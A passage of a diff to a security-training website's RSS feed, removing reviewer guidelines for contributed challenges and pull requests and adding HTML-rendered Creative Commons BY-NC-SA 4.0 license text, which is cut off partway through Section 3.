-SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
-CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
-OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
-OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
-&lt;/code>&lt;/pre></description></item><item><title>Essentials:</title><link>/essentials/reviewing/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/essentials/reviewing/</guid><description>
-&lt;h1 id="sss-reviewer-guidelines">SSS Reviewer Guidelines&lt;/h1>
-&lt;p>These are recommendations for reviewing contributions to SSS repositories.
-Reviewing is important to ensure high quality and consistency of content.
-As a reviewer, we trust you will vet contributions and provide constructive suggestions to update them to fit the SSS guidelines.&lt;/p>
-&lt;h2 id="activities--challenges">Activities / Challenges&lt;/h2>
-&lt;p>Make sure that activities / challenges are of good quality:&lt;/p>
-&lt;ul>
-&lt;li>Difficulty is properly set.&lt;/li>
-&lt;li>The topic of the activity / challenge is appropriate.&lt;/li>
-&lt;li>The provided solution is working.&lt;/li>
-&lt;li>Vulnerability and explanations are easy to understand.&lt;/li>
-&lt;/ul>
-&lt;h2 id="assets">Assets&lt;/h2>
-&lt;p>Check if all of them are used and mentioned in the content.
-If the assets are not original, make sure their license is compatible to &lt;a href="./COPYING.md">ours&lt;/a> and that their source is properly cited.
-Verify that their names are appropriate and respect the following rules:&lt;/p>
-&lt;ul>
-&lt;li>Use dash between words (e.g. &lt;code>image-name.png&lt;/code>).&lt;/li>
-&lt;li>Use only lowercase ASCII characters.&lt;/li>
-&lt;/ul>
-&lt;h2 id="content">Content&lt;/h2>
-&lt;p>Make sure that the content is of good quality:&lt;/p>
-&lt;ul>
-&lt;li>It follows the general structure of a &lt;a href="https://github.com/security-summer-school/template-public/tree/master/session-name-1">session&lt;/a>.&lt;/li>
-&lt;li>Assets are displayed well.&lt;/li>
-&lt;li>The content has at most one sentence per line.&lt;/li>
-&lt;li>The content is easy to understand.&lt;/li>
-&lt;li>Wording and general spelling are correct.&lt;/li>
-&lt;li>Proper formatting is used (such as bold, italic, typewriter formats).&lt;/li>
-&lt;/ul>
-&lt;h2 id="working-on-pull-requests">Working on Pull Requests&lt;/h2>
-&lt;p>You will review contributions as pull requests, following the &lt;a href="https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/reviewing-changes-in-pull-requests/about-pull-request-reviews">PR review guidelines from GitHub&lt;/a>.
-Contributions must follow the &lt;a href="CONTRIBUTING.md">contributing guidelines&lt;/a>.&lt;/p>
-&lt;p>Add your review as comments and request for changes to the PR until everything is ready to be approved.
-Add any comments regarding one or more explicit lines as review comments and only publish them together when submitting your review.
-Do not add each individual suggestion or comment as standalone.
-Before approving the PR, make sure that all GitHub Actions tests ended successfully.
-Once approved, either you or someone with proper access rights can use &lt;code>Rebase and merge&lt;/code> to merge the PR commits and integrate the contribution.&lt;/p></description></item></channel></rss>
+&lt;div class="highlight">&lt;pre tabindex="0" style="background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-text" data-lang="text">&lt;span style="display:flex;">&lt;span>Attribution-NonCommercial-ShareAlike 4.0 International
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>=======================================================================
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Creative Commons Corporation (&amp;#34;Creative Commons&amp;#34;) is not a law firm and
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>does not provide legal services or legal advice. Distribution of
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Creative Commons public licenses does not create a lawyer-client or
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>other relationship. Creative Commons makes its licenses and related
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>information available on an &amp;#34;as-is&amp;#34; basis. Creative Commons gives no
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>warranties regarding its licenses, any material licensed under their
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>terms and conditions, or any related information. Creative Commons
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>disclaims all liability for damages resulting from their use to the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>fullest extent possible.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Using Creative Commons Public Licenses
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Creative Commons public licenses provide a standard set of terms and
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>conditions that creators and other rights holders may use to share
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>original works of authorship and other material subject to copyright
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>and certain other rights specified in the public license below. The
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>following considerations are for informational purposes only, are not
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>exhaustive, and do not form part of our licenses.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Considerations for licensors: Our public licenses are
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> intended for use by those authorized to give the public
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> permission to use material in ways otherwise restricted by
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> copyright and certain other rights. Our licenses are
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> irrevocable. Licensors should read and understand the terms
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> and conditions of the license they choose before applying it.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Licensors should also secure all rights necessary before
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> applying our licenses so that the public can reuse the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> material as expected. Licensors should clearly mark any
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> material not subject to the license. This includes other CC-
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> licensed material, or material used under an exception or
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> limitation to copyright. More considerations for licensors:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wiki.creativecommons.org/Considerations_for_licensors
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Considerations for the public: By using one of our public
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> licenses, a licensor grants the public permission to use the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> licensed material under specified terms and conditions. If
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> the licensor&amp;#39;s permission is not necessary for any reason--for
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> example, because of any applicable exception or limitation to
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> copyright--then that use is not regulated by the license. Our
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> licenses grant only permissions under copyright and certain
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> other rights that a licensor has authority to grant. Use of
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> the licensed material may still be restricted for other
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> reasons, including because others have copyright or other
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> rights in the material. A licensor may make special requests,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> such as asking that all changes be marked or described.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Although not required by our licenses, you are encouraged to
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> respect those requests where reasonable. More considerations
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> for the public:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> wiki.creativecommons.org/Considerations_for_licensees
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>=======================================================================
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Public License
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>By exercising the Licensed Rights (defined below), You accept and agree
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>to be bound by the terms and conditions of this Creative Commons
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attribution-NonCommercial-ShareAlike 4.0 International Public License
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>(&amp;#34;Public License&amp;#34;). To the extent this Public License may be
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>interpreted as a contract, You are granted the Licensed Rights in
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>consideration of Your acceptance of these terms and conditions, and the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Licensor grants You such rights in consideration of benefits the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Licensor receives from making the Licensed Material available under
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>these terms and conditions.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Section 1 -- Definitions.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a. Adapted Material means material subject to Copyright and Similar
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Rights that is derived from or based upon the Licensed Material
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> and in which the Licensed Material is translated, altered,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> arranged, transformed, or otherwise modified in a manner requiring
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> permission under the Copyright and Similar Rights held by the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Licensor. For purposes of this Public License, where the Licensed
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Material is a musical work, performance, or sound recording,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Adapted Material is always produced where the Licensed Material is
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> synched in timed relation with a moving image.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> b. Adapter&amp;#39;s License means the license You apply to Your Copyright
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> and Similar Rights in Your contributions to Adapted Material in
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> accordance with the terms and conditions of this Public License.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c. BY-NC-SA Compatible License means a license listed at
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> creativecommons.org/compatiblelicenses, approved by Creative
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Commons as essentially the equivalent of this Public License.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> d. Copyright and Similar Rights means copyright and/or similar rights
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> closely related to copyright including, without limitation,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> performance, broadcast, sound recording, and Sui Generis Database
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Rights, without regard to how the rights are labeled or
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> categorized. For purposes of this Public License, the rights
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> specified in Section 2(b)(1)-(2) are not Copyright and Similar
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Rights.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> e. Effective Technological Measures means those measures that, in the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> absence of proper authority, may not be circumvented under laws
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> fulfilling obligations under Article 11 of the WIPO Copyright
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Treaty adopted on December 20, 1996, and/or similar international
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> agreements.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> f. Exceptions and Limitations means fair use, fair dealing, and/or
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> any other exception or limitation to Copyright and Similar Rights
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> that applies to Your use of the Licensed Material.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> g. License Elements means the license attributes listed in the name
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> of a Creative Commons Public License. The License Elements of this
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Public License are Attribution, NonCommercial, and ShareAlike.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> h. Licensed Material means the artistic or literary work, database,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> or other material to which the Licensor applied this Public
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> License.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> i. Licensed Rights means the rights granted to You subject to the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> terms and conditions of this Public License, which are limited to
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> all Copyright and Similar Rights that apply to Your use of the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Licensed Material and that the Licensor has authority to license.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> j. Licensor means the individual(s) or entity(ies) granting rights
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> under this Public License.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> k. NonCommercial means not primarily intended for or directed towards
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> commercial advantage or monetary compensation. For purposes of
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> this Public License, the exchange of the Licensed Material for
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> other material subject to Copyright and Similar Rights by digital
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> file-sharing or similar means is NonCommercial provided there is
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> no payment of monetary compensation in connection with the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exchange.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> l. Share means to provide material to the public by any means or
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> process that requires permission under the Licensed Rights, such
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> as reproduction, public display, public performance, distribution,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> dissemination, communication, or importation, and to make material
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> available to the public including in ways that members of the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> public may access the material from a place and at a time
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> individually chosen by them.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> m. Sui Generis Database Rights means rights other than copyright
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> resulting from Directive 96/9/EC of the European Parliament and of
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> the Council of 11 March 1996 on the legal protection of databases,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> as amended and/or succeeded, as well as other essentially
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> equivalent rights anywhere in the world.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> n. You means the individual or entity exercising the Licensed Rights
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> under this Public License. Your has a corresponding meaning.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Section 2 -- Scope.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a. License grant.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 1. Subject to the terms and conditions of this Public License,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> the Licensor hereby grants You a worldwide, royalty-free,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> non-sublicensable, non-exclusive, irrevocable license to
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exercise the Licensed Rights in the Licensed Material to:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a. reproduce and Share the Licensed Material, in whole or
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> in part, for NonCommercial purposes only; and
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> b. produce, reproduce, and Share Adapted Material for
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NonCommercial purposes only.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 2. Exceptions and Limitations. For the avoidance of doubt, where
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Exceptions and Limitations apply to Your use, this Public
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> License does not apply, and You do not need to comply with
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> its terms and conditions.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 3. Term. The term of this Public License is specified in Section
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 6(a).
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 4. Media and formats; technical modifications allowed. The
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Licensor authorizes You to exercise the Licensed Rights in
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> all media and formats whether now known or hereafter created,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> and to make technical modifications necessary to do so. The
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Licensor waives and/or agrees not to assert any right or
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> authority to forbid You from making technical modifications
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> necessary to exercise the Licensed Rights, including
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> technical modifications necessary to circumvent Effective
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Technological Measures. For purposes of this Public License,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> simply making modifications authorized by this Section 2(a)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (4) never produces Adapted Material.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 5. Downstream recipients.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a. Offer from the Licensor -- Licensed Material. Every
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> recipient of the Licensed Material automatically
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> receives an offer from the Licensor to exercise the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Licensed Rights under the terms and conditions of this
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Public License.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> b. Additional offer from the Licensor -- Adapted Material.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Every recipient of Adapted Material from You
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> automatically receives an offer from the Licensor to
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exercise the Licensed Rights in the Adapted Material
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> under the conditions of the Adapter&amp;#39;s License You apply.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c. No downstream restrictions. You may not offer or impose
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> any additional or different terms or conditions on, or
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> apply any Effective Technological Measures to, the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Licensed Material if doing so restricts exercise of the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Licensed Rights by any recipient of the Licensed
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Material.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 6. No endorsement. Nothing in this Public License constitutes or
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> may be construed as permission to assert or imply that You
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> are, or that Your use of the Licensed Material is, connected
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> with, or sponsored, endorsed, or granted official status by,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> the Licensor or others designated to receive attribution as
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> provided in Section 3(a)(1)(A)(i).
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> b. Other rights.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 1. Moral rights, such as the right of integrity, are not
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> licensed under this Public License, nor are publicity,
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> privacy, and/or other similar personality rights; however, to
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> the extent possible, the Licensor waives and/or agrees not to
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> assert any such rights held by the Licensor to the limited
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> extent necessary to allow You to exercise the Licensed
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Rights, but not otherwise.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 2. Patent and trademark rights are not licensed under this
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Public License.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 3. To the extent possible, the Licensor waives any right to
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> collect royalties from You for the exercise of the Licensed
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Rights, whether directly or through a collecting society
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> under any voluntary or waivable statutory or compulsory
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> licensing scheme. In all other cases the Licensor expressly
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> reserves any right to collect such royalties, including when
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> the Licensed Material is used other than for NonCommercial
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> purposes.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Section 3 -- License Conditions.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Your exercise of the Licensed Rights is expressly made subject to the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>following conditions.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a. Attribution.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 1. If You Share the Licensed Material (including in modified
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> form), You must:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> a. retain the following if it is supplied by the Licensor
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> with the Licensed Material:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> i. identification of the creator(s) of the Licensed
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Material and any others designated to receive
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> attribution, in any reasonable manner requested by
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> the Licensor (including by pseudonym if
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> designated);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ii. a copyright notice;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> iii. a notice that refers to this Public License;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> iv. a notice that refers to the disclaimer of
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> warranties;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v. a URI or hyperlink to the Licensed Material to the
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> extent reasonably practicable;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> b. indicate if You modified the Licensed Material and
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> retain an indication of any previous modifications; and
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> c. indicate the Licensed Material is licensed under this
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Public License, and include the text of, or the URI or
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hyperlink to, this Public License.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 2. You may satisfy the conditions in Section 3(a)(1) in any
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> reasonable manner based on the medium, means, and context in
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> which You Share the Licensed Material. For example, it may be
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> reasonable to satisfy the conditions by providing a URI or
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hyperlink to a resource that includes the required
